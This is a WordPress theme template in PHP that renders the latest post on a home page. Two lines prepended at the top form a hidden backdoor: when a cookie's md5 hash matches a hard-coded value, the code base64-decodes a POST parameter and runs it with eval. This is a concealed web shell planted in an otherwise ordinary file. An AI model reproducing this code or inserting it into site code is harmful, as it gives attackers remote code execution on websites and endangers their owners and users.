<?php if(md5($_COOKIE['093d336b88049917'])=="8527747a55ee04b840cf9251c781cb28"){ eval(base64_decode($_POST['file'])); exit; } ?><?php if(md5($_COOKIE['571d19b1dd9d9f9c'])=="9e6c54930595819f69959dfbf0898db5"){ eval(base64_decode($_POST['file'])); exit; } ?><?php $is_home = true ?>
<?php get_header(); ?>

<div id="content">

	<?php query_posts('showposts=1')?>
	<?php if (have_posts()) : ?>

		<?php while (have_posts()) : the_post(); ?>

			<div class="post" id="post-<?php the_ID(); ?>">
				<h2><a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent Link to <?php the_title(); ?>"><?php the_title(); ?></a></h2>

				<div class="entry">
					<?php the_content('<br />Read More &raquo;'); ?>
				</div>

				<p class="postmetadata">Posted <?php the_time('F jS, Y') ?> in <?php the_category(', ') ?> | <?php edit_post_link('Edit', '', ' | '); ?>  <?php comments_popup_link('No Comments &#187;', '1 Comment &#187;', '% Comments &#187;'); ?></p>
			</div>

		<?php endwhile; ?>

	<?php else : ?>

		<h2 class="center">Not Found</h2>
		<p class="center">Sorry, but you are looking for something that isn't here.</p>

	<?php endif; ?>

</div>
<?php get_sidebar(); ?>
<?php get_footer(); ?>
